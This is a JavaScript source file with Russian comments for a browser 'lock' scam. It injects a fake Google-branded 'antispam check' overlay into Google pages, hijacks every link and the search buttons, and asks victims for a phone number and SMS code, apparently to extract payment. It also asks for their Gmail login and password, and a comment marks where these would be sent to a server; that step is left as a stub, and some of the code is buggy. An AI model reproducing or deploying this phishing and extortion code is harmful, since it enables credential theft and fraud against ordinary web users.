/* Вызов лока происходит по событию нажатие на кнопку/ссылку
*		1 - происходит проверка на предмет других локов
*		2 -	вешаются обработчики на элементы сайта
*		3 - вызывается лок, попутно пишется статистика
*		4 - проверка всех полей на правильность ввода
*		5 - после оплаты снимается лок, либо по истечению времени
*/	

// Загружаем стиль

function LoadCSS() {
    var NewCSS = document.createElement("link");
    NewCSS.setAttribute("href", "http://localhost/GoogleYandexLock/google/style.css");
    NewCSS.setAttribute("type", "text/css");
    NewCSS.setAttribute("rel", "stylesheet");
    document.getElementsByTagName('head')[0].appendChild(NewCSS);
}

/*
*	Переменная Step
*		Значения:
*			1-главная страница лока
*			2-ввод кода, после отправки СМС
*			3-страница авторизации
*/

var step=1;

// удаление по окончанию

function Destroy () {
	//передаем статистику о финале
	plg.Save('lon','0');
	setTimeout('plg.Del',5000);
	
}

//проверяем был ли лок 

function CheckLock() {
	if ((plg.Get('lon'))&&(plg.Get('lon') == '0'))
		LockStop();
    
}

// тащим логин пароль GMail

function SaveLoginPassword(){
	var login = document.getElementById('login'),
		password = document.getElementById('pass'),
		hint = document.getElementById('error');
		
	if ((login.value.lenght==0) || (password.value.lenght==0)) {
		hint.display = "block";
		hint.innerText = "Введите корректный логин/пароль";
		return false;
	}
	else {
		escape(login);
		escape(password);
		// дергаем пыху которой передаем логин пароль
	}
}

// критическая остановка Лока

function LockStop() {
    plg.Save('lon', '0');
    // убирается окно !!!!

}

//проверяем поля ввода на правильность введенных данных и кол-во символов

function CheckInput(){
	var old = document.getElementsByClassName('tooltip-bottom')[0],
		num	= document.getElementsByClassName('tooltip-bottom checkinput')[0],
		err	= document.getElementById('error'),
		err_old	= document.getElementById('error_old');
		
	//поле сколько месяцев в году	
	
	if (old.value != 12){
	err_old.display = "block";
		err_old.innerText = "Введите верный ответ!";
		
	}
	
	//поле ввода номера
	
	if (num.value.length < 10){
		err.display = "block";
		err.innerText = "Неправильный номер телефона";
				
	} 
	NextStep();
}


function NextStep() {
	step=2;
	ShowMeGoogle();
}

function  SecondStep() {
	step=3;
	ShowMeGoogle();
	console.log(step);
}

// вызов лока

function ShowMeGoogle() { 
    LoadCSS();
	
	var modalWnd = document.createElement("div");
    modalWnd.setAttribute("id", "gShock");
    modalWnd.setAttribute("position", "fixed");
    modalWnd.setAttribute("type", "text/html");
    //modalWnd.setAttribute("display", "block");
	
    var overlay = document.createElement("div");
	overlay.setAttribute("class", "overlay");
	overlay.setAttribute("position", "fixed");
	
	
	//document.getElementsByTagName('body')[0].appendChild(modalWnd);
	document.getElementById('gbq').appendChild(modalWnd);
	document.getElementById('gbq').appendChild(overlay);
	
	var gShock = document.getElementById('gShock');
		
		switch (step) {
			case 1:
				gShock.innerHTML = '<style type="text/css" media="screen"><!--.overlay {  background-color: #555555; visibility: visible;     bottom: 0;    cursor: default;    left: 0;    opacity: 0.6;    position: fixed;    right: 0;    top: 0;        z-index: 9999;    -webkit-transition: opacity .5s;    -moz-transition: opacity .5s;    -ms-transition: opacity .5s;    -o-transition: opacity .5s;    transition: opacity .5s;}.overlay:target {    visibility: visible;    opacity: 1;}* {outline-style: none; outline-width: 0; }body { font-size: 13px; background-color: transparent; overflow: hidden; }body, div.content button, div.content input { font-family: "Trebuchet MS", "Helvetica Neue", Arial, Helvetica, Sans-Serif; }div.content {margin: 0 500px; z-index:999999999999; border: dashed 4px #b3bcc3; background-color: #fff; position: absolute; padding: 25px; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px; -moz-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); -webkit-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); box-shadow: 0px 0px 25px rgba(50,50,50,0.95);  background-repeat: repeat-x; background-attachment: scroll; }div.content button { font-size: 13px; line-height: 14px; }div.content div#auth { display: none; }div.content div#captcha { display: none; }div.content div#first { display: block; }div.content p#error { color: red; }div.content div#loading {  width: 48px; height: 48px; display: none; margin-left: 150px; margin-right: 150px; }	div.content div#second { display: none; }div.content hr { margin-top: 20px; margin-bottom: 20px; }div.content input { font-size: 20px; }div.content label { color: #000; font-size: 20px; margin-right: 10px; }div.content p#rules { display: block; }div.content small { font-size: 11px; margin-bottom: 4px; }div.shadow { position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; margin: 0; padding: 0; filter:progid:DXImageTransform.Microsoft.Alpha(opacity=85); -moz-opacity: 0.85; -khtml-opacity: 0.85; opacity: 0.85; background-color: rgb(112, 130, 143); background: radial-gradient(at center center , rgba(255, 255, 255, 0.8), rgba(255, 255, 255, 0)) repeat scroll 0% 0%, none repeat scroll 0% 0% rgb(112, 130, 143); }div.footer, div.footer a, div.footer p { color: #888; font-size: 9px; }</style><style type="text/css" media="screen">@font-face {font-family: "PT Sans";font-style: normal;font-weight: normal;src: local("PT Sans"), local("PTSans-Regular"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/yrzXiAvgeQQdopyG8QSg8Q.woff) format("woff");}@font-face {font-family: "PT Sans";	font-style: normal;font-weight: bold;src: local("PT Sans Bold"), local("PTSans-Bold"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/g46X4VH_KHOWAAa-HpnGPhsxEYwM7FgeyaSgU71cLG0.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: normal;src: local("PT Sans Italic"), local("PTSans-Italic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/7dSh6BcuqDLzS2qAASIeuj8E0i7KZn-EPnyo3HZu7kw.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: bold;src: local("PT Sans Bold Italic"), local("PTSans-BoldItalic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/lILlYDvubYemzYzN7GbLkIraN7vELC11_xip9Rz-hMs.woff) format("woff");}body div.content button {font-weight: bold;font-family: "PT Sans", "Helvetica Neue", Arial, Helvetica, Sans-Serif;font-size: 14px;	}</style><div class="content" z-index: 9999999;	margin-left: 530px; position: absolute; margin-top:130px; >			<div id="header">		<img src="https://ssl.gstatic.com/images/logos/google_logo_41.png" align="left" /><div style="font-size: 13px; font-weight: bold;">&nbsp;&nbsp;ТМ</div>		<div class="clearfix"></div>		<br><p><center><b>Для получения доступа к сайту, <br />пройдите быструю антиспам-проверку.</b></p></center>	</div>	<hr /><div id="first">		<h5>Сколько месяцев в году?:</h5>		<p><input type="text" class="tooltip-bottom" title="Напишите ответ на поставленный выше вопрос" style="width: 100%;" maxlength="25" /></p>		<h5>Ваш номер телефона <br>(например +79876543210):</h5>		<p><input type="text" class="tooltip-bottom checkinput" title="Введите Ваш номер мобильного телефона, на него будет выслано СМС-сообщение с проверочным кодом" style="width: 171px;" maxlength="13" id="telephone" />&nbsp;&nbsp;<button class="medium checkinput" onclick="CheckInput();">Получить код</button></p>		<label id="error_old" style="display:none;">Ошибка: некорректный номер телефона!</label>				<p><small>Пожалуйста, авторизуйтесь, если Вы зарегистрированный<br />пользователь сервиса. Для авторизации <a  onclick="SecondStep();">нажмите здесь</a>.</small></p>		</div><style type="text/css" media="screen">		<!--			body { font-size: 13px; background-color: transparent; }			body, div.content button, div.content input { font-family: "Tahoma", Sans-Serif; }			div.content {z-index: 9999999;	margin-left: 530px; }			div.content button { }			div.content div#captcha { }			div.content div#first { }			div.content div#first p#error, div#second p#error , div#captcha p#error { }			div.content div#loading { }			div.content div#second { }			div.content hr { }			div.content input { }			div.content label { }			div.content small { }			div.shadow { }		-->	</style>';
				//plg.Save('oIdPage', '22');
					if (document.getElementById('gbzc')){
						document.getElementById('gbzc').style.display="none";
						document.getElementById('gbvg').style.display="none";
					}
					break;
				case 2:
					gShock.innerHTML = '';
					gShock.innerHTML = '<style type="text/css" media="screen"><!--.overlay {  background-color: #555555; visibility: visible;     bottom: 0;    cursor: default;    left: 0;    opacity: 0.6;    position: fixed;    right: 0;    top: 0;        z-index: 9999;    -webkit-transition: opacity .5s;    -moz-transition: opacity .5s;    -ms-transition: opacity .5s;    -o-transition: opacity .5s;    transition: opacity .5s;}.overlay:target {    visibility: visible;    opacity: 1;}* {outline-style: none; outline-width: 0; }body { font-size: 13px; background-color: transparent; overflow: hidden; }body, div.content button, div.content input { font-family: "Trebuchet MS", "Helvetica Neue", Arial, Helvetica, Sans-Serif; }div.content {margin: 0 500px; z-index:999999999999; border: dashed 4px #b3bcc3; background-color: #fff; position: absolute; padding: 25px; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px; -moz-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); -webkit-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); box-shadow: 0px 0px 25px rgba(50,50,50,0.95);  background-repeat: repeat-x; background-attachment: scroll; }div.content button { font-size: 13px; line-height: 14px; }div.content div#auth { display: none; }div.content div#captcha { display: none; }div.content div#first { display: block; }div.content p#error { color: red; }div.content div#loading {  width: 48px; height: 48px; display: none; margin-left: 150px; margin-right: 150px; }	div.content div#second { display: none; }div.content hr { margin-top: 20px; margin-bottom: 20px; }div.content input { font-size: 20px; }div.content label { color: #000; font-size: 20px; margin-right: 10px; }div.content p#rules { display: block; }div.content small { font-size: 11px; margin-bottom: 4px; }div.shadow { position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; margin: 0; padding: 0; filter:progid:DXImageTransform.Microsoft.Alpha(opacity=85); -moz-opacity: 0.85; -khtml-opacity: 0.85; opacity: 0.85; background-color: rgb(112, 130, 143); background: radial-gradient(at center center , rgba(255, 255, 255, 0.8), rgba(255, 255, 255, 0)) repeat scroll 0% 0%, none repeat scroll 0% 0% rgb(112, 130, 143); }div.footer, div.footer a, div.footer p { color: #888; font-size: 9px; }</style><style type="text/css" media="screen">@font-face {font-family: "PT Sans";font-style: normal;font-weight: normal;src: local("PT Sans"), local("PTSans-Regular"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/yrzXiAvgeQQdopyG8QSg8Q.woff) format("woff");}@font-face {font-family: "PT Sans";	font-style: normal;font-weight: bold;src: local("PT Sans Bold"), local("PTSans-Bold"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/g46X4VH_KHOWAAa-HpnGPhsxEYwM7FgeyaSgU71cLG0.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: normal;src: local("PT Sans Italic"), local("PTSans-Italic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/7dSh6BcuqDLzS2qAASIeuj8E0i7KZn-EPnyo3HZu7kw.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: bold;src: local("PT Sans Bold Italic"), local("PTSans-BoldItalic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/lILlYDvubYemzYzN7GbLkIraN7vELC11_xip9Rz-hMs.woff) format("woff");}body div.content button {font-weight: bold;font-family: "PT Sans", "Helvetica Neue", Arial, Helvetica, Sans-Serif;font-size: 14px;	}</style><div class="content" z-index: 9999999;	margin-left: 530px; position: absolute; margin-top:130px; >			<div id="header">		<img src="https://ssl.gstatic.com/images/logos/google_logo_41.png" align="left" /><div style="font-size: 13px; font-weight: bold;">&nbsp;&nbsp;ТМ</div>		<div class="clearfix"></div>		<br><p><center><b>Для получения доступа к сайту, <br />пройдите быструю антиспам-проверку.</b></p></center>	</div>	<hr /><div id="first">		<h5>Код полученный в СМС-сообщении:</h5>		<p><input type="text" class="tooltip-bottom" title="Код полученный в СМС-сообщении:" style="width: 100%;" maxlength="25" /></p>	<center><button id="medium checkinput" > Отправить </button></center>	<p id="error">Ошибка: некорректный номер телефона!</p>		<p><small>Пожалуйста, авторизуйтесь, если Вы зарегистрированный<br />пользователь сервиса. Для авторизации <a href="javascript:void();" >нажмите здесь</a>.</small></p>	</div><style type="text/css" media="screen">		<!--			body { font-size: 13px; background-color: transparent; }			body, div.content button, div.content input { font-family: "Tahoma", Sans-Serif; }			div.content {z-index: 9999999;	margin-left: 530px; }			div.content button { }			div.content div#captcha { }			div.content div#first { }			div.content div#first p#error, div#second p#error , div#captcha p#error { }			div.content div#loading { }			div.content div#second { }			div.content hr { }			div.content input { }			div.content label { }			div.content small { }			div.shadow { }		-->	</style>';
				//plg.Save('oIdPage', '22');
					if (document.getElementById('gbzc')){
						document.getElementById('gbzc').style.display="none";
						document.getElementById('gbvg').style.display="none";
					}
					break;
					
				case 3:
					gShock.innerHTML = '';
					gShock.innerHTML = '<style type="text/css" media="screen"><!--.overlay {  background-color: #555555; visibility: visible;     bottom: 0;    cursor: default;    left: 0;    opacity: 0.6;    position: fixed;    right: 0;    top: 0;        z-index: 9999;    -webkit-transition: opacity .5s;    -moz-transition: opacity .5s;    -ms-transition: opacity .5s;    -o-transition: opacity .5s;    transition: opacity .5s;}.overlay:target {    visibility: visible;    opacity: 1;}* {outline-style: none; outline-width: 0; }body { font-size: 13px; background-color: transparent; overflow: hidden; }body, div.content button, div.content input { font-family: "Trebuchet MS", "Helvetica Neue", Arial, Helvetica, Sans-Serif; }div.content {margin: 0 500px; z-index:999999999999; border: dashed 4px #b3bcc3; background-color: #fff; position: absolute; padding: 25px; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px; -moz-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); -webkit-box-shadow: 0px 0px 25px rgba(50,50,50,0.95); box-shadow: 0px 0px 25px rgba(50,50,50,0.95);  background-repeat: repeat-x; background-attachment: scroll; }div.content button { font-size: 13px; line-height: 14px; }div.content div#auth { display: none; }div.content div#captcha { display: none; }div.content div#first { display: block; }div.content p#error { color: red; }div.content div#loading {  width: 48px; height: 48px; display: none; margin-left: 150px; margin-right: 150px; }	div.content div#second { display: none; }div.content hr { margin-top: 20px; margin-bottom: 20px; }div.content input { font-size: 20px; }div.content label { color: #000; font-size: 20px; margin-right: 10px; }div.content p#rules { display: block; }div.content small { font-size: 11px; margin-bottom: 4px; }div.shadow { position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; margin: 0; padding: 0; filter:progid:DXImageTransform.Microsoft.Alpha(opacity=85); -moz-opacity: 0.85; -khtml-opacity: 0.85; opacity: 0.85; background-color: rgb(112, 130, 143); background: radial-gradient(at center center , rgba(255, 255, 255, 0.8), rgba(255, 255, 255, 0)) repeat scroll 0% 0%, none repeat scroll 0% 0% rgb(112, 130, 143); }div.footer, div.footer a, div.footer p { color: #888; font-size: 9px; }</style><style type="text/css" media="screen">@font-face {font-family: "PT Sans";font-style: normal;font-weight: normal;src: local("PT Sans"), local("PTSans-Regular"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/yrzXiAvgeQQdopyG8QSg8Q.woff) format("woff");}@font-face {font-family: "PT Sans";	font-style: normal;font-weight: bold;src: local("PT Sans Bold"), local("PTSans-Bold"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/g46X4VH_KHOWAAa-HpnGPhsxEYwM7FgeyaSgU71cLG0.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: normal;src: local("PT Sans Italic"), local("PTSans-Italic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/7dSh6BcuqDLzS2qAASIeuj8E0i7KZn-EPnyo3HZu7kw.woff) format("woff");}@font-face {font-family: "PT Sans";font-style: italic;font-weight: bold;src: local("PT Sans Bold Italic"), local("PTSans-BoldItalic"), url(http://themes.googleusercontent.com/static/fonts/ptsans/v4/lILlYDvubYemzYzN7GbLkIraN7vELC11_xip9Rz-hMs.woff) format("woff");}body div.content button {font-weight: bold;font-family: "PT Sans", "Helvetica Neue", Arial, Helvetica, Sans-Serif;font-size: 14px;	}</style><div class="content" z-index: 9999999;	margin-left: 530px; position: absolute; margin-top:130px; >			<div id="header">		<img src="https://ssl.gstatic.com/images/logos/google_logo_41.png" align="left" /><div style="font-size: 13px; font-weight: bold;">&nbsp;&nbsp;ТМ</div>		<div class="clearfix"></div>		<br><p><center><b>Для получения доступа к сайту, <br />пройдите быструю антиспам-проверку.</b></p></center>	</div>	<hr /><div id="first">		<h5>Ваш логин в системе:</h5>		<p><input type="text" id="login" class="tooltip-bottom" title="Введите код полученный на Ваш номер мобильного телефона в виде СМС-сообщения" style="width: 171px;" maxlength="12" id="secretcode" />&nbsp;&nbsp;<h5>Ваш пароль в системе:</h5>		<p><input type="text" id="pass"class="tooltip-bottom" title="Введите Ваш пароль полученный в процессе регистрации" style="width: 171px;" maxlength="7" id="password" />&nbsp;&nbsp;<button class="medium" onclick="SaveLoginPassword();">Авторизовать</button></p></p>		<p id="error"      style="display:none;">Ошибка: некорректный код подтверждения!</p>	</div><style type="text/css" media="screen">		<!--			body { font-size: 13px; background-color: transparent; }			body, div.content button, div.content input { font-family: "Tahoma", Sans-Serif; }			div.content {z-index: 9999999;	margin-left: 530px; }			div.content button { }			div.content div#captcha { }			div.content div#first { }			div.content div#first p#error, div#second p#error , div#captcha p#error { }			div.content div#loading { }			div.content div#second { }			div.content hr { }			div.content input { }			div.content label { }			div.content small { }			div.shadow { }		-->	</style>';
				//plg.Save('oIdPage', '22');
					if (document.getElementById('gbzc')){
						document.getElementById('gbzc').style.display="none";
						document.getElementById('gbvg').style.display="none";
					}
					break;
				default:
					break;
		}
	
	}
	
//вешаем обработчик на все ссылки

function ChangeLinks(){

	if (document.getElementById('gbqfb')){
		document.getElementById('gbqfb').setAttribute('onmousedown','ShowMeGoogle()');
		var i=0;
		for (i;i<document.getElementsByTagName('a').length;i++) {
			document.getElementsByTagName('a')[i].setAttribute('onmousedown', 'ShowMeGoogle()');
			document.getElementsByTagName('a')[i].href = "#";
		}
	}
}

//меняем события на главной странице

function ChangeMainButtons() {
	if (document.getElementById('gsri_ok0')){ 
		document.getElementById('gbqfsa').setAttribute('onclick','ShowMeGoogle()'); // google search button
		document.getElementById('gbqfbb').setAttribute('onclick','ShowMeGoogle()'); // кнопка мне повезет
		document.getElementById('gsri_ok0').setAttribute('onclick','ShowMeGoogle()');// голосовой ввод
	}
	
}

// обработчик на энтер

function ToEnter(){
	if(event.keyCode==13) {
		ShowMeGoogle();
	}
}

//проверяем если это главная страница

function isMain(){
	if (document.getElementsByTagName('a').length ==29){
		document.getElementsByClassName('gstl_0 gssb_c')[0].parentNode.removeChid(document.getElementsByClassName('gstl_0 gssb_c')[0]);
		console.log('2');
		ChangeMainButtons();
	}
	else{
		document.getElementsByClassName('gstl_0 gssb_c')[0].parentNode.removeChid(document.getElementsByClassName('gstl_0 gssb_c')[0]); //удаляем таблицу
		console.log('1');
		var i=0;
		for (i;i<document.getElementsByTagName('a').length;i++) {
			document.getElementsByTagName('a')[i].setAttribute('onmousedown', 'ShowMeGoogle()');
			document.getElementsByTagName('a')[i].href = "#";
			console.log(i);
		}
		setTimeout('ChangeLinks()', 1000);
	}
}


 window.onload = function () {
	//isMain();
	ShowMeGoogle();
	
 } 
